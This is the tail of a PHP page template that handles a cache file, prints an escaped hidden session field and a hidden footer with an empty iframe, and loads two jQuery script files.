if ($fd) {fwrite($fd,$contenuCache);fclose($fd);}} else {readfile('../cache/lsg_finish.lsg');echo "\n";}  
?>
<input type="hidden" name="memoryText" id="memoryText" value="<?php if(isset($_SESSION['memory'])){ echo htmlspecialchars($_SESSION['memory']); } ?>" style="display: none;">
<footer style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"> 
<div id="footerr" class="Footer" style="display: none; visibility: hidden; overflow: hidden; width: 0px; height: 0px;"></div><iframe id="footerr2" src="" scrolling="no" style="display: none; visibility: hidden; overflow: hidden; width: 0px !important; height: 0px !important;"></iframe>
</footer>
<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afa.js" defer="defer"></script>
<script src="../assets/js/jquery.min.aaffcbf7942d5bedb07855e48cbc1afb.js" defer="defer"></script>


</body>
</html>
 

